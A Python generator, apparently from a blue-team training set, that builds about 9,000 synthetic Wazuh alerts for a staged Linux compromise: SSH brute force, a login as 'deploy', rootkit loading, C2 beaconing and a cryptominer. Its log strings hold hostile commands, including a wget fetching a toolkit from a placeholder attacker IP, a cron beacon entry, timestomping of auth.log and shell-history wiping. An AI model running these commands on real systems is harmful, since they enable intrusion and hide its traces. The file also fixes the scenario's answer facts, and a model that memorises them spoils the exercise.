"""
WazuhBOTS -- Scenario 3: Operation Ghost in the Shell
=====================================================
Linux Compromise: SSH Brute Force → Rootkit → C2 → Cryptominer

Agent   : 003 / lnx-srv / 172.26.0.31
Date    : 2026-03-03
Attacker: 203.0.113.42

Target alert count ≈ 9,000+
CRITICAL: Exactly 8,347 failed SSH alerts (rules 5710/5716)
Successful login at exactly 2026-03-03T05:23:41Z
"""

import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

from .base import (
    AlertBuilder,
    BaseScenarioGenerator,
    incremental_timestamps,
    random_timestamp,
)

ATTACKER_IP = "203.0.113.42"
TOOLKIT_SERVER = "203.0.113.100"
C2_IP = "203.0.113.100"
C2_PORT = "8443"
C2_DOMAIN = "update.systemnodes.net"
MINING_DOMAIN = "stratum.cryptopool.xyz"
AGENT_ID = "003"
AGENT_NAME = "lnx-srv"
AGENT_IP = "172.26.0.31"
DAY = datetime(2026, 3, 3, tzinfo=timezone.utc)

BRUTE_START = DAY.replace(hour=2, minute=0, second=0)
BRUTE_END = DAY.replace(hour=5, minute=23, second=40)
LOGIN_TIME = DAY.replace(hour=5, minute=23, second=41)


class GhostShellGenerator(BaseScenarioGenerator):
    scenario_id = 3
    scenario_name = "scenario3_ghost_shell"

    def __init__(self, datasets_dir: Path):
        self.output_dir = datasets_dir / self.scenario_name
        self.ab = AlertBuilder(AGENT_ID, AGENT_NAME, AGENT_IP)

    # ------------------------------------------------------------------

    def _ssh_brute_force(self) -> list[dict]:
        """Exactly 8,347 failed SSH alerts between 02:00 and 05:23:40."""
        stamps = incremental_timestamps(BRUTE_START, BRUTE_END, 8347)
        usernames = [
            "root", "admin", "deploy", "ubuntu", "test", "user",
            "postgres", "mysql", "oracle", "ftp", "www-data",
            "nobody", "operator", "backup", "sysadmin", "guest",
            "service", "daemon", "bin", "mail",
        ]
        alerts = []
        for i, ts in enumerate(stamps):
            user = random.choice(usernames)
            port = random.randint(32768, 65535)
            # Alternate between 5710 (individual) and 5716 (brute-force grouping)
            if i % 50 == 0 and i > 0:
                rid, desc, lvl = "5716", "SSHD: authentication failure (brute force).", 10
            else:
                rid, desc, lvl = "5710", "Attempt to login using a non-existent user.", 5
            full_log = (
                f"Mar  3 {ts.strftime('%H:%M:%S')} lnx-srv sshd[{random.randint(1000,9999)}]: "
                f"Failed password for {'invalid user ' if user != 'deploy' else ''}{user} "
                f"from {ATTACKER_IP} port {port} ssh2"
            )
            alerts.append(self.ab.build(
                timestamp=ts, rule_id=rid, rule_description=desc, rule_level=lvl,
                rule_groups=["syslog", "sshd", "authentication_failed", "wazuhbots"],
                decoder_name="sshd",
                location="/var/log/auth.log",
                srcip=ATTACKER_IP,
                srcport=str(port),
                srcuser=user,
                full_log=full_log,
                mitre=self.ab.mitre_block(["T1110.001"], "Credential Access"),
                data={"program_name": "sshd"},
            ))
        return alerts

    def _successful_login(self) -> list[dict]:
        """Successful SSH login at exactly 05:23:41Z, user=deploy, GeoIP=Russia."""
        ts = LOGIN_TIME
        full_log = (
            f"Mar  3 05:23:41 lnx-srv sshd[4821]: "
            f"Accepted password for deploy from {ATTACKER_IP} port 48231 ssh2"
        )
        return [self.ab.build(
            timestamp=ts,
            rule_id="5715",
            rule_description="SSHD: authentication success.",
            rule_level=3,
            rule_groups=["syslog", "sshd", "authentication_success", "wazuhbots"],
            decoder_name="sshd",
            location="/var/log/auth.log",
            srcip=ATTACKER_IP,
            srcport="48231",
            srcuser="deploy",
            full_log=full_log,
            data={
                "program_name": "sshd",
                "GeoLocation": self.ab.geoip_data("Russia", "Moscow", 55.7558, 37.6173),
            },
            mitre=self.ab.mitre_block(["T1078"], "Defense Evasion"),
        )]

    def _toolkit_download(self, start: datetime) -> list[dict]:
        """Download linpeas_kit.tar.gz from attacker server."""
        alerts = []
        cmds = [
            f"wget http://{TOOLKIT_SERVER}/tools/linpeas_kit.tar.gz -O /tmp/linpeas_kit.tar.gz",
            "tar xzf /tmp/linpeas_kit.tar.gz -C /tmp/.tools/",
            "chmod +x /tmp/.tools/linpeas.sh",
            "/tmp/.tools/linpeas.sh > /tmp/.tools/linpeas_output.txt",
        ]
        exe_paths = [
            "/usr/bin/wget",
            "/usr/bin/tar",
            "/usr/bin/chmod",
            "/tmp/.tools/linpeas.sh",
        ]
        for i, cmd in enumerate(cmds):
            ts = start + timedelta(seconds=i * 15)
            rid = "87931" if i == 0 else "87933"
            desc = "Suspicious Download: wget/curl piped to interpreter or saving to /tmp." if i == 0 else "Web Server Process: Suspicious child process spawned by web server user."
            lvl = 12 if i == 0 else 10
            full_log = f"Mar  3 {ts.strftime('%H:%M:%S')} lnx-srv audit: deploy executed: {cmd}"
            alerts.append(self.ab.build(
                timestamp=ts, rule_id=rid, rule_description=desc, rule_level=lvl,
                rule_groups=["syslog", "audit", "wazuhbots"],
                decoder_name="auditd",
                location="/var/log/audit/audit.log",
                srcuser="deploy",
                full_log=full_log,
                data={
                    "command": cmd,
                    "audit": {"exe": exe_paths[i]},
                },
                mitre=self.ab.mitre_block(["T1105"], "Command and Control"),
            ))
        return alerts

    def _fim_changes(self, start: datetime) -> list[dict]:
        """~20 FIM alerts for system file modifications."""
        paths = [
            "/etc/passwd", "/etc/shadow", "/etc/sudoers",
            "/etc/ssh/sshd_config", "/etc/crontab",
            "/usr/local/bin/svc_update", "/tmp/.tools/linpeas.sh",
            "/var/spool/cron/crontabs/deploy",
            "/etc/ld.so.preload", "/etc/pam.d/common-auth",
            "/root/.ssh/authorized_keys", "/etc/hosts",
            "/etc/resolv.conf", "/usr/lib/systemd/system/svc-update.service",
            "/etc/rc.local", "/etc/profile.d/backdoor.sh",
            "/var/www/html/index.html", "/opt/app/config.py",
            "/tmp/.cache/.env", "/dev/shm/.hidden_binary",
        ]
        stamps = incremental_timestamps(start, start + timedelta(minutes=30), 20, jitter_seconds=3)
        alerts = []
        for ts, path in zip(stamps, paths):
            alerts.append(self.ab.build(
                timestamp=ts,
                rule_id="550",
                rule_description="Integrity checksum changed.",
                rule_level=7,
                rule_groups=["ossec", "syscheck", "syscheck_entry_modified", "wazuhbots"],
                decoder_name="syscheck_integrity_changed",
                location="syscheck",
                full_log=f"File '{path}' checksum changed.",
                syscheck={
                    "path": path,
                    "event": "modified",
                    "changed_attributes": ["size", "md5", "sha256", "mtime"],
                    "md5_before": f"{random.randbytes(16).hex()}",
                    "md5_after": f"{random.randbytes(16).hex()}",
                },
                mitre=self.ab.mitre_block(["T1565.001"], "Impact"),
            ))
        return alerts

    def _cron_persistence(self, start: datetime) -> list[dict]:
        """Crontab persistence — attacker adds cron entry for C2 callback."""
        alerts = []
        alerts.append(self.ab.build(
            timestamp=start,
            rule_id="87934",
            rule_description="Persistence: Crontab modification or scheduled task change detected.",
            rule_level=10,
            rule_groups=["persistence", "suspicious_process", "wazuhbots"],
            decoder_name="auditd",
            location="/var/log/audit/audit.log",
            srcuser="root",
            full_log=f"Mar  3 {start.strftime('%H:%M:%S')} lnx-srv audit: root: crontab -e (added: */5 * * * * /tmp/.tools/beacon.sh)",
            data={
                "command": "crontab -e",
                "audit": {"exe": "/usr/bin/crontab"},
            },
            syscheck={
                "path": "/var/spool/cron/crontabs/root",
                "event": "modified",
                "changed_attributes": ["size", "md5"],
                "diff": "+*/5 * * * * /tmp/.tools/beacon.sh",
            },
            mitre=self.ab.mitre_block(["T1053.003"], "Persistence"),
        ))
        return alerts

    def _rootkit_install(self, start: datetime) -> list[dict]:
        """Rootkit: insmod syshook.ko, auditd key=modules."""
        alerts = []
        # insmod command
        alerts.append(self.ab.build(
            timestamp=start,
            rule_id="87943",
            rule_description="Privilege Escalation: Kernel module loading detected - possible rootkit installation.",
            rule_level=12,
            rule_groups=["syslog", "audit", "privilege_escalation", "rootkit", "wazuhbots"],
            decoder_name="auditd",
            location="/var/log/audit/audit.log",
            srcuser="root",
            full_log=f"Mar  3 {start.strftime('%H:%M:%S')} lnx-srv audit[1]: insmod syshook.ko",
            data={
                "command": "insmod syshook.ko",
                "audit": {
                    "key": "modules",
                    "syscall": "init_module",
                    "exe": "/sbin/insmod",
                    "success": "yes",
                },
            },
            mitre=self.ab.mitre_block(["T1014", "T1547.006"], "Defense Evasion"),
        ))
        # Auditd detection of finit_module
        alerts.append(self.ab.build(
            timestamp=start + timedelta(seconds=1),
            rule_id="80700",
            rule_description="Auditd: Kernel module loaded.",
            rule_level=10,
            rule_groups=["audit", "audit_command", "wazuhbots"],
            decoder_name="auditd",
            location="/var/log/audit/audit.log",
            full_log=f"type=SYSCALL msg=audit({start.timestamp():.3f}:1234): arch=c000003e syscall=313 success=yes a0=syshook key=\"modules\"",
            data={
                "audit": {
                    "key": "modules",
                    "syscall": "finit_module",
                    "success": "yes",
                    "a0": "syshook",
                },
            },
            mitre=self.ab.mitre_block(["T1547.006"], "Persistence"),
        ))
        return alerts

    def _c2_channel(self, start: datetime) -> list[dict]:
        """C2: outbound TCP 8443 to 203.0.113.100, DNS update.systemnodes.net."""
        alerts = []
        # Initial connection
        alerts.append(self.ab.build(
            timestamp=start,
            rule_id="87954",
            rule_description="C2 Suspect: Outbound connection to commonly used C2 port detected.",
            rule_level=7,
            rule_groups=["c2", "beaconing", "non_standard_port", "wazuhbots"],
            decoder_name="syslog",
            location="/var/log/syslog",
            srcip=AGENT_IP, dstip=C2_IP, dstport=C2_PORT,
            full_log=f"Mar  3 {start.strftime('%H:%M:%S')} lnx-srv kernel: [UFW ALLOW] IN= OUT=eth0 SRC={AGENT_IP} DST={C2_IP} PROTO=TCP DPT={C2_PORT}",
            mitre=self.ab.mitre_block(["T1571"], "Command and Control"),
        ))
        # DNS resolution for C2 domain
        alerts.append(self.ab.build(
            timestamp=start + timedelta(seconds=2),
            rule_id="87950",
            rule_description="C2 Beaconing: DNS query for known C2 domain.",
            rule_level=10,
            rule_groups=["c2", "beaconing", "dns_tunnel", "wazuhbots"],
            decoder_name="named",
            location="/var/log/syslog",
            full_log=f"Mar  3 {start.strftime('%H:%M:%S')} lnx-srv dnsmasq: query[A] {C2_DOMAIN} from 127.0.0.1",
            data={"query_name": C2_DOMAIN, "query_type": "A", "srcip": "127.0.0.1"},
            mitre=self.ab.mitre_block(["T1071.004"], "Command and Control"),
        ))
        # Beaconing every ~60s (30 beacons)
        for i in range(30):
            ts = start + timedelta(seconds=60 * (i + 1) + random.randint(-5, 5))
            alerts.append(self.ab.build(
                timestamp=ts,
                rule_id="87953",
                rule_description="C2 Beaconing: Repeated HTTP requests to the same URL from same source.",
                rule_level=10,
                rule_groups=["c2", "beaconing", "wazuhbots"],
                decoder_name="syslog",
                location="/var/log/syslog",
                srcip=AGENT_IP, dstip=C2_IP, dstport=C2_PORT,
                full_log=f"lnx-srv: TCP connection {AGENT_IP}:{random.randint(40000,60000)} -> {C2_IP}:{C2_PORT}",
                mitre=self.ab.mitre_block(["T1071.001", "T1573"], "Command and Control"),
            ))
        return alerts

    def _cryptominer(self, start: datetime) -> list[dict]:
        """Cryptominer: DNS stratum.cryptopool.xyz + high CPU."""
        alerts = []
        # DNS resolution for mining pool
        alerts.append(self.ab.build(
            timestamp=start,
            rule_id="87950",
            rule_description="C2 Beaconing: DNS query for known mining pool domain.",
            rule_level=10,
            rule_groups=["c2", "beaconing", "dns_tunnel", "wazuhbots"],
            decoder_name="named",
            location="/var/log/syslog",
            full_log=f"Mar  3 {start.strftime('%H:%M:%S')} lnx-srv dnsmasq: query[A] {MINING_DOMAIN} from 127.0.0.1",
            data={"query_name": MINING_DOMAIN, "query_type": "A"},
            mitre=self.ab.mitre_block(["T1496"], "Impact"),
        ))
        # Mining connections
        for i in range(15):
            ts = start + timedelta(seconds=30 * (i + 1))
            alerts.append(self.ab.build(
                timestamp=ts,
                rule_id="87954",
                rule_description="C2 Suspect: Outbound connection to mining pool.",
                rule_level=7,
                rule_groups=["c2", "beaconing", "non_standard_port", "wazuhbots"],
                decoder_name="syslog",
                location="/var/log/syslog",
                srcip=AGENT_IP, dstip="93.184.216.34", dstport="3333",
                full_log=f"lnx-srv: TCP {AGENT_IP} -> {MINING_DOMAIN}:3333 stratum+tcp connection",
                data={"query_name": MINING_DOMAIN},
                mitre=self.ab.mitre_block(["T1496"], "Impact"),
            ))
        return alerts

    def _log_tampering(self, start: datetime) -> list[dict]:
        """Log tampering: touch on /var/log/auth.log with 7200s mtime/ctime discrepancy."""
        alerts = []
        # timestomping of auth.log
        alerts.append(self.ab.build(
            timestamp=start,
            rule_id="87963",
            rule_description="Log Tampering: Timestamp manipulation (timestomping) command detected.",
            rule_level=12,
            rule_groups=["log_tampering", "anti_forensics", "timestomp", "wazuhbots"],
            decoder_name="auditd",
            location="/var/log/audit/audit.log",
            srcuser="root",
            full_log=f"Mar  3 {start.strftime('%H:%M:%S')} lnx-srv audit: root executed: touch -d '2026-03-01T00:00:00' /var/log/auth.log",
            data={
                "command": "touch -d '2026-03-01T00:00:00' /var/log/auth.log",
            },
            syscheck={
                "path": "/var/log/auth.log",
                "event": "modified",
                "changed_attributes": ["mtime"],
                "mtime_after": "2026-03-01T00:00:00",
                "ctime_after": "2026-03-03T05:38:00",
                "diff_seconds": "7200",
            },
            mitre=self.ab.mitre_block(["T1070.006"], "Defense Evasion"),
        ))
        # FIM detection of auth.log change
        alerts.append(self.ab.build(
            timestamp=start + timedelta(seconds=5),
            rule_id="550",
            rule_description="Integrity checksum changed.",
            rule_level=7,
            rule_groups=["ossec", "syscheck", "wazuhbots"],
            decoder_name="syscheck_integrity_changed",
            location="syscheck",
            full_log="File '/var/log/auth.log' modified.",
            syscheck={
                "path": "/var/log/auth.log",
                "event": "modified",
                "changed_attributes": ["mtime"],
                "mtime_before": "2026-03-03T05:23:41",
                "mtime_after": "2026-03-01T00:00:00",
            },
            mitre=self.ab.mitre_block(["T1070.006"], "Defense Evasion"),
        ))
        # History clearing
        alerts.append(self.ab.build(
            timestamp=start + timedelta(seconds=10),
            rule_id="87962",
            rule_description="Log Tampering: Shell history clearing command detected.",
            rule_level=12,
            rule_groups=["log_tampering", "anti_forensics", "wazuhbots"],
            decoder_name="auditd",
            location="/var/log/audit/audit.log",
            srcuser="root",
            full_log=f"Mar  3 {start.strftime('%H:%M:%S')} lnx-srv audit: root executed: history -c; > ~/.bash_history",
            data={"command": "history -c; > ~/.bash_history"},
            mitre=self.ab.mitre_block(["T1070.003"], "Defense Evasion"),
        ))
        return alerts

    def _baseline_noise(self, count: int) -> list[dict]:
        """Normal Linux system events."""
        stamps = incremental_timestamps(
            DAY.replace(hour=0, minute=1, second=0),
            DAY.replace(hour=23, minute=58, second=59),
            count, jitter_seconds=5,
        )
        templates = [
            ("5501", "Login session opened.", 3, "pam"),
            ("5502", "Login session closed.", 3, "pam"),
            ("1002", "Unknown problem somewhere in the system.", 3, "syslog"),
            ("530", "File ownership changed.", 5, "syscheck"),
            ("516", "Audit daemon configuration changed.", 3, "syslog"),
            ("5104", "Interface entered promiscuous mode.", 3, "syslog"),
            ("2502", "Syslog: User authentication failure.", 5, "syslog"),
            ("5402", "Successful sudo to ROOT executed.", 3, "sudo"),
        ]
        benign_users = ["deploy", "root", "www-data", "nobody", "syslog"]
        alerts = []
        for ts in stamps:
            rid, desc, lvl, grp = random.choice(templates)
            alerts.append(self.ab.build(
                timestamp=ts, rule_id=rid, rule_description=desc, rule_level=lvl,
                rule_groups=[grp, "wazuhbots"],
                decoder_name="syslog",
                location="/var/log/syslog",
                srcuser=random.choice(benign_users),
                full_log=f"Mar  3 {ts.strftime('%H:%M:%S')} lnx-srv: {desc}",
            ))
        return alerts

    # ------------------------------------------------------------------
    def generate(self) -> list[dict]:
        random.seed(44)

        brute = self._ssh_brute_force()           # exactly 8,347
        login = self._successful_login()           # 1
        toolkit = self._toolkit_download(LOGIN_TIME + timedelta(minutes=5))  # 4
        fim = self._fim_changes(LOGIN_TIME + timedelta(minutes=15))          # 20
        rootkit = self._rootkit_install(LOGIN_TIME + timedelta(minutes=30))  # 2
        cron_persist = self._cron_persistence(LOGIN_TIME + timedelta(minutes=32))  # 1
        c2 = self._c2_channel(LOGIN_TIME + timedelta(minutes=35))            # 32
        miner = self._cryptominer(LOGIN_TIME + timedelta(hours=1))           # 16
        tampering = self._log_tampering(LOGIN_TIME + timedelta(hours=1, minutes=15))  # 3

        attack = brute + login + toolkit + fim + rootkit + cron_persist + c2 + miner + tampering
        noise_count = max(0, 9000 - len(attack))
        noise = self._baseline_noise(noise_count)

        all_alerts = attack + noise
        all_alerts.sort(key=lambda a: a["timestamp"])

        # Verify SSH brute-force count
        ssh_failed = sum(1 for a in all_alerts if a["rule"]["id"] in ("5710", "5716"))
        assert ssh_failed == 8347, f"Expected 8347 SSH failures, got {ssh_failed}"

        return all_alerts
